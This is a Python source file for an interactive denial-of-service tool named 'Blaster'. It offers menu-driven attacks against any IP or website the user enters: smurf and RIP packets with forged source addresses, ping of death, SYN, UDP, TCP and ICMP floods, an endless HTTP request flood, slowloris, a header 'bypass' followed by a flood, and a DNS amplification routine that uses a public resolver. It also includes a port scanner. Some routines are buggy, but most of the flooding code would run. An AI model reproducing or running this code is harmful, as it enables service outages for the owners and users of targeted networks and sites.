import socket
import time
import requests
import random
import os
from colorama import *
from scapy.all import *
from scapy.all import IP, ICMP
import struct
import argparse as args
import subprocess

valid_commands = ["help", "l3", "layer3", "l7", "layer7", "layer4", "l4",
                  "port", "byte", "smurf", "pod", "rip", "syn", "http",
                  "codes", "slowloris", "icmp", "dns", "wap", "udp", "tcp"]

codes ="""
-----HTTP-----
100 - Continue
101 - Switching Protocols
200 - OK
201 - Created
202 - Accepted
203 - Non-Authoritative Information
204 - No Content
205 - Reset Content
206 - Partial Content
300 - Multiple Choices
301 - Moved Permanently
302 - Found
303 - See Other
304 - Not Modified
305 - Use Proxy
307 - Temporary Redirect
400 - Bad Request
401 - Unauthorized
402 - Payment Required
403 - Forbidden
404 - Not Found
405 - Method Not Allowed
406 - Not Acceptable
407 - Proxy Authentication Required
408 - Request Timeout
409 - Conflict
410 - Gone
411 - Length Required
412 - Precondition Failed
413 - Request Entity Too Large
414 - Request-URI Too Long
415 - Unsupported Media Type
416 - Requested Range Not Satisfiable
417 - Expectation Failed
418 - I'm a teapot
422 - Unprocessable Entity
423 - Locked
424 - Failed Dependency
425 - Too Early
426 - Upgrade Required
428 - Precondition Required
429 - Too Many Requests
431 - Request Header Fields Too Large
451 - Unavailable For Legal Reasons
500 - Internal Server Error
501 - Not Implemented
502 - Bad Gateway
503 - Service Unavailable
504 - Gateway Timeout
505 - HTTP Version Not Supported
511 - Network Authentication Required
          
-----HTTPS-----
200 - OK: Request successful.
201 - Created: New resource created.
204 - No Content: Successful, no response.
400 - Bad Request: Client error.
401 - Unauthorized: Authentication required.
403 - Forbidden: Authorization denied.
404 - Not Found: Resource not found.
500 - Internal Server Error: Server issue.
502 - Bad Gateway: Invalid response from upstream.
503 - Service Unavailable: Server overloaded or in maintenance.
504 - Gateway Timeout: Upstream server didn't respond in time.
"""
layer3 ="""
                                    ╔╗ ╦  ╔═╗╔═╗╔╦╗╔═╗╦═╗
                                    ╠╩╗║  ╠═╣╚═╗ ║ ║╣ ╠╦╝
                                __  ╚═╝╩═╝╩ ╩╚═╝ ╩ ╚═╝╩╚═  _____
                               / /___ ___  _____  _____   |__  /
                              / / __ `/ / / / _ \/ ___/    /_ < 
                             / / /_/ / /_/ /  __/ /      ___/ / 
                            /_/\__,_/\__, /\___/_/      /____/  
                                    /____/                     
                ╔══════════════════════════╦════════════════════════════╗
                ║         [1] Smurf attack ║          [2] PoD           ║
                ╚╦════════════════════════╦╩╦══════════════════════════╦╝
                 ║        [3] RIP         ║ ║         [4] SYN          ║
                 ╚╦══════════════════════╦╝ ╚╦════════════════════════╦╝
                  ║═════════════════════[5] icmp══════════════════════║
                 ╔╩═══════════════════════╝ ╚═════════════════════════╩╗
                 ║           Example of an attack: smurf               ║
                 ╚═════════════════════════════════════════════════════╝
"""
layer4 ="""
                                ╔╗ ╦  ╔═╗╔═╗╔╦╗╔═╗╦═╗
                                ╠╩╗║  ╠═╣╚═╗ ║ ║╣ ╠╦╝
                                ╚═╝╩═╝╩ ╩╚═╝ ╩ ╚═╝╩╚═ 
                             _    __ __   _____ ___  _  _   
                            | |  /  \\ `v' / __| _ \| || |  
                            | |_| /\ |`. .'| _|| v /`._  _| 
                            |___|_||_| !_! |___|_|_\   |_|  
                ╔══════════════════════════╦════════════════════════════╗
                ║         [1] TCP          ║          [2] UDP           ║
                ╚╦════════════════════════╦╩╦══════════════════════════╦╝
                 ║        [3] smurf       ║ ║         [4] SYN          ║
                 ╚╦══════════════════════╦╝ ╚╦════════════════════════╦╝
                  ║       [5] icmp       ║   ║        [6] PoD         ║
                 ╔╩══════════════════════╝   ╚════════════════════════╩╗
                 ║           Example of an attack: icmp                ║
                 ╚═════════════════════════════════════════════════════╝
"""

layer7 = """
                                ╔╗ ╦  ╔═╗╔═╗╔╦╗╔═╗╦═╗
                                ╠╩╗║  ╠═╣╚═╗ ║ ║╣ ╠╦╝
                                ╚═╝╩═╝╩ ╩╚═╝ ╩ ╚═╝╩╚═  
                    ██╗░░░░░░█████╗░██╗░░░██╗███████╗██████╗░███████╗
                    ██║░░░░░██╔══██╗╚██╗░██╔╝██╔════╝██╔══██╗╚════██║
                    ██║░░░░░███████║░╚████╔╝░█████╗░░██████╔╝░░░░██╔╝
                    ██║░░░░░██╔══██║░░╚██╔╝░░██╔══╝░░██╔══██╗░░░██╔╝░
                    ███████╗██║░░██║░░░██║░░░███████╗██║░░██║░░██╔╝░░
                    ╚══════╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝░░╚═╝░░░                 
                ╔══════════════════════════╦════════════════════════════╗
                ║         [1] HTTP flood   ║          [2] Slowloris     ║
                ╚╦════════════════════════╦╩╦══════════════════════════╦╝
                 ║        [3] DNS         ║ ║         [4] WAP bypass   ║
                ╔╩════════════════════════╝ ╚══════════════════════════╩╗
                ║              Example of an attack: http               ║
                ╚═══════════════════════════════════════════════════════╝

"""
back ="""
                ====================================================================
                │|            ▄▄▄▄· ▄▄▌   ▄▄▄· .▄▄ · ▄▄▄▄▄▄▄▄ .▄▄▄                |│
                │|             █ ▀█▪██•  ▐█ ▀█ ▐█ ▀. •██  ▀▄.▀·▀▄ █·              |│
                │|            ▐█▀▀█▄██▪  ▄█▀▀█ ▄▀▀▀█▄ ▐█.▪▐▀▀▪▄▐▀▀▄               |│
                │|            ██▄▪▐█▐█▌▐▌▐█ ▪▐▌▐█▄▪▐█ ▐█▌·▐█▄▄▌▐█•█▌              |│
                │|            ·▀▀▀▀ .▀▀▀  ▀  ▀  ▀▀▀▀  ▀▀▀  ▀▀▀ .▀  ▀              |│
                │|                        (Made by Verty)                         |│
                ====================================================================
                                ----Type help for help----
"""

print(Fore.RED + """
                ====================================================================
                │|            ▄▄▄▄· ▄▄▌   ▄▄▄· .▄▄ · ▄▄▄▄▄▄▄▄ .▄▄▄                |│
                │|             █ ▀█▪██•  ▐█ ▀█ ▐█ ▀. •██  ▀▄.▀·▀▄ █·              |│
                │|            ▐█▀▀█▄██▪  ▄█▀▀█ ▄▀▀▀█▄ ▐█.▪▐▀▀▪▄▐▀▀▄               |│
                │|            ██▄▪▐█▐█▌▐▌▐█ ▪▐▌▐█▄▪▐█ ▐█▌·▐█▄▄▌▐█•█▌              |│
                │|            ·▀▀▀▀ .▀▀▀  ▀  ▀  ▀▀▀▀  ▀▀▀  ▀▀▀ .▀  ▀              |│
                │|                        (Made by Verty)                         |│
                ====================================================================
                                   ----Type help for help----
""")

cmd = input("[Blaster~@Verty]> ").lower()
while cmd not in valid_commands:
    cmd = input("[Blaster~@Verty]> ").lower()
    

if cmd == "help":
    print("""

   █▀▀▄ █░░ █▀▀█ █▀▀ ▀▀█▀▀ █▀▀ █▀▀█ 
   █▀▀▄ █░░ █▄▄█ ▀▀█ ░░█░░ █▀▀ █▄▄▀ 
   ▀▀▀░ ▀▀▀ ▀░░▀ ▀▀▀ ░░▀░░ ▀▀▀ ▀░▀▀
╔══════════════Commands:══════════════╗
║                                     ║
║ layer7 (l7) - Layer 7 methods       ║
║ layer4 (l4) - Layer 4 methods       ║
║ layer3 (l3) - Layer 3 methods       ║
╠═════════════════════════════════════╣
║ port - port scan                    ║
║ byte - byte exploit (Made by verty) ║
║ help - Display this message         ║ 
║ codes - status codes                ║
║                                     ║ 
╚═════════════════════════════════════╝	
Script crashing? Try running as administrator 

""")
    cmd = input("[Blaster~@Verty]> ").lower()
    while cmd not in valid_commands:
        cmd = input("[Blaster~@Verty]> ").lower()



if cmd =="codes":
    print(codes)
    cmd = input("[Blaster~@Verty]> ").lower()
    while cmd not in valid_commands:
        cmd = input("[Blaster~@Verty]> ").lower()


if cmd == "layer3" or cmd == "l3":
    print(layer3)
    cmd = input("[Blaster~@Verty]> ").lower()
    while cmd not in valid_commands:
        cmd = input("[Blaster~@Verty]> ").lower()

if cmd == "layer7" or cmd == "l7":
    print(layer7)
    cmd = input("[Blaster~@Verty]> ").lower()
    while cmd not in valid_commands:
        cmd = input("[Blaster~@Verty]> ").lower()

if cmd == "layer4" or cmd == "l4":
    print(layer4)
    cmd = input("[Blaster~@Verty]> ").lower()
    while cmd not in valid_commands:
        cmd = input("[Blaster~@Verty]> ").lower()

if cmd =="smurf":
    smurf_ip = input('[Enter an ip]> ')
    smurf_port = input("[Enter a port]> ")
    # Determine the broadcast address (you should calculate it based on your network)
    broadcast_ip = input("[Enter the broadcast address]> ")  # Replace with the actual broadcast address

    smurf_times = int(input("[How many times]> "))

    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

    # Send a large number of packets to the broadcast address with a forged source IP
    for i in range(smurf_times):  # You can adjust the number of packets
        packet = IP(src=smurf_ip, dst=broadcast_ip) / ICMP() / "Blasted!"
        s.sendto(bytes(packet), (broadcast_ip, int(smurf_port)))


elif cmd =="pod":

    def is_valid_ip(ip):
        try:
            parts = ip.split(".")
            if len(parts) != 4:
                return False
            for part in parts:
                if not 0 <= int(part) <= 255:
                    return False
            return True
        except ValueError:
            return False

    while True:
        ip = input("[Enter an IP]> ")
        if is_valid_ip(ip):
            break
        else:
            print("Invalid ip.")

    while True:
        try:
            num_pings = int(input("[How many times]> "))
            if num_pings > 0:
                break
            else:
                print("Number must be greater than 0")
        except ValueError:
            print("Invalid input.")

    while True:
        try:
            packet_size = int(input("[How many bytes]> "))
            if packet_size > 0:
                break
            else:
                print("Packet size must be greater than 0.")
        except ValueError:
            print("Invalid input. Please enter a valid number.")

    ping_command = f"ping {ip} -n {num_pings} -l {packet_size}"

    print("Pinging...")
    os.system(ping_command)


elif cmd =="rip":
    target_IP = input("[Enter the target IP]> ")
    destination_port = int(input("[Enter the destination port]> ")) 
    times = int(input("[How many times]> "))
    spoofed_IP = "192.168.0.1"  # Replace with a spoofed IP or keep it like this

    # Create a RIP packet
    eth_header = b"\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x08\x00"

    ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 20 + 8 + 4, 54321, 0, 255, 17, 0, socket.inet_aton(spoofed_IP), socket.inet_aton(target_IP))

    udp_header = struct.pack('!HHHH', 520, destination_port, 8 + 4, 0)

    rip_header = struct.pack('!BBH', 1, 2, 0)

    rip_entry = struct.pack('!HH4s4s', 2, 1, b'\x00\x00\x00\x00', socket.inet_aton(target_IP))

    rip_packet = eth_header + ip_header + udp_header + rip_header + rip_entry

    # Create a raw socket
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)

    # Send the RIP packet
    for i in range(times):
        s.sendto(rip_packet, (target_IP, destination_port))
        print(f"RIP packet sent successfully to {target_IP} on port {destination_port}.")


elif cmd =="syn":
    syn_ip = input("[Enter an IP]> ")
    syn_times = int(input("[How many times]> "))
    syn_port = int(input("[Enter a port]> "))

    # Generate a random source IP address
    source_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

    # Create a socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Send SYN packets to the target
    for i in range(syn_times):
        try:
            sock.connect((syn_ip, syn_port))
            sock.send(b"SYN")
            print(f"SYN packet sent to {syn_ip} at port {syn_port}")
            sock.close()
        except ConnectionRefusedError:
            print(f"Error sending SYN packet: The target machine actively refused the connection")
        except Exception as e:
            print(f"Error sending SYN packet: {e}")
        time.sleep(0.1)

elif cmd =="icmp":
    targetIP = input("[Enter an IP]> ")
    targetPort = int(input("[Enter a port]> "))
    icmp_times = int(input("[How many times]> "))

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #udp

    sock.settimeout(1)

    for i in range(icmp_times):
        sock.sendto('ping'.encode(), (targetIP, targetPort))

    # Close the socket
    sock.close()



elif cmd == "http":
    numa = 1
    num = 0
    while True:
        website = input("[Enter a website (include the http or https://)]> ")
        port = input('[Enter a port]> ')

        # Constructing the URL
        url = website + ':' + port

        # Sending the request
        if url.startswith('http://'):
            while True:
                response = requests.get(url)
                num = num + numa
                print(f"status code: {response.status_code} request number: {num}")
        elif url.startswith('https://'):
            while True:
                response = requests.get(url, verify=True)
                num = num + numa
                print(f"status code: {response.status_code} request number: {num}")
        else:
            print('Invalid URL. Please try again.')


elif cmd =="slowloris":
    def slowmain():
        server_host = input("[Enter a server]> ")
        server_port = int(input("[Enter a port]> "))
        num_sockets = int(input("[How many sockets?]> "))
        while True:
            successfully_sent = 0  # Count of successfully sent sockets

            while successfully_sent < num_sockets:
                batch_size = min(100, num_sockets - successfully_sent)

                failed_sockets = []  # List to track sockets that failed to send

                for _ in range(batch_size):
                    # Create a TCP socket
                    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                    # Connect to the server
                    try:
                        client_socket.connect((server_host, server_port))
                        successfully_sent += 1
                    except Exception as e:
                        failed_sockets.append(client_socket)
                        print(f"Socket failed to send with error: {str(e)}")

                # Send and close the failed sockets
                send_and_close_sockets(server_host, *failed_sockets)
                print(f"{successfully_sent} sockets successfully sent!")

    def send_and_close_sockets(server_host, *sockets):
        for client_socket in sockets:
            try:
                # Send an HTTP request with Keep-Alive headers
                http_request = "GET / HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n\r\n".format(server_host)
                client_socket.send(http_request.encode('utf-8'))

            except Exception as e:
                print(f"Failed socket encountered an error: {str(e)}")

            # Close the socket
            client_socket.close()

    if __name__ == "__main__":
        slowmain()
elif cmd =="wap":
    timedns = 0

    wap_target = input("[Enter a server]> ")
    wap_port = int(input("[Enter a port]> "))

    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Socket created")

    server_address = (wap_target, wap_port)
    print('Connecting to %s port %s' % server_address)
    sock.connect(server_address)

    message = b'GET / HTTP/1.1\r\n\r\n'
    print('Sending "%s"' % message)
    sock.sendall(message)

    # Look for the response
    amount_received = 0
    amount_expected = len(message)

    while amount_received < amount_expected:
        data = sock.recv(4096)
        amount_received += len(data)
        print('Received "%s"' % data)

    bypass_message = b'GET / HTTP/1.1\r\nHost: localhost\r\nX-Forwarded-For: 127.0.0.1\r\n\r\n'
    print('Sending "%s"' % bypass_message)
    sock.sendall(bypass_message)

    print("here")

    for x in range(10000):
        sock.send(b'flood_packet_' + str(x).encode())
        
        # Add a delay between requests (e.g., 0.1 seconds)
        time.sleep(0.1)

    # Close the socket outside the loop
    sock.close()

elif cmd =="dns":
    def dns_amplification_attack(target, dns_server, request_length):
        try:
            # Create a UDP socket
            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            request = b'A' * request_length + b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01'

            udp_socket.sendto(request, (dns_server, 53))

            response, address = udp_socket.recvfrom(65535)

            udp_socket.sendto(response, (target, 53))

            print(f"Attack sent! attack num: {timedns}")

        except Exception as e:
            print(f"Attack failed! Error: {str(e)}")

    dnstarget_ip = input("[Enter an IP]> ")
    dnstimes = int(input("[How many times]> "))
    dnsbytes = int(input("[How many bytes]> "))

    for _ in range(dnstimes):
        dns_amplification_attack(dnstarget_ip, '8.8.8.8', dnsbytes)
        timedns = timedns =+ 1
        time.sleep(0.3)

elif cmd =="byte":
    def byte():
        print("ip byter - by verty")
        print("This script will take a byte out of an IP address.")
        print()
        print("('Byte' is some term I came up with. It basically just brute forces the minimum amount of bytes an IP can take.)")
        print()

        while True:
            ip = input("[Enter an IP]> ")
            byte = int(input("[Enter the starting bytes]> "))

            while True:
                if ping_ip(ip, byte):
                    print(f"{ip} is up. -bytes = {byte}")
                    choice = input("Would you like to go back or keep pinging? Type 'y' to keep pinging or 'n' to go back: ")
                    if choice.lower() == 'n':
                        break
                else:
                    print(f"{ip} is down. Byting the IP... Bytes = {byte}")
                    byte -= 1

    def ping_ip(ip, byte):
        cmd = f'ping {ip} -n 1 -l {byte}'
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        process.communicate()
        return process.returncode == 0

    if __name__ == "__main__":
        byte()
if cmd =="port":
    # Get user inputs
    hostname = input("[Enter an IP]> ")
    start_port = int(input("[Enter the starting port number]> "))
    end_port = int(input("[Enter the ending port number]> "))

    # Create an empty list to store results
    open_ports = []

    # Start scanning
    print("Scanning ports " + str(start_port) + " through " + str(end_port) + " on " + hostname)

    for i in range(start_port, end_port+1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((hostname, i))
        if result == 0:
            print("Port " + str(i) + " is open")
            open_ports.append(i)
        else:
            print("Port " + str(i) + " is closed")
        sock.close()

    print("Open ports found: ", open_ports)

if cmd =="udp":
    udptarget = input("[Enter an IP]> ")
    udpport = int(input("[Enter a port]> "))
    packet_count = int(input("[How many packets]> "))

    packet = random._urandom(1024)

    for u in range(packet_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((udptarget, udpport))
            print(f"Connected to {udptarget} on {udpport}")
            s.sendto(packet, (udptarget, udpport))
        except:
            pass

if cmd =="tcp":
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcptarget = input("[Enter an IP]> ")
    port = int(input("[Enter a port]>"))
    NUM_SOCKETS = int(input("[How many times]> "))

    server_address = (tcptarget, port)
    print('connecting to {} port {}'.format(*server_address))
    sock.connect(server_address)



    for i in range(NUM_SOCKETS):
        sock.sendall(b'Blasted!')

    sock.close()
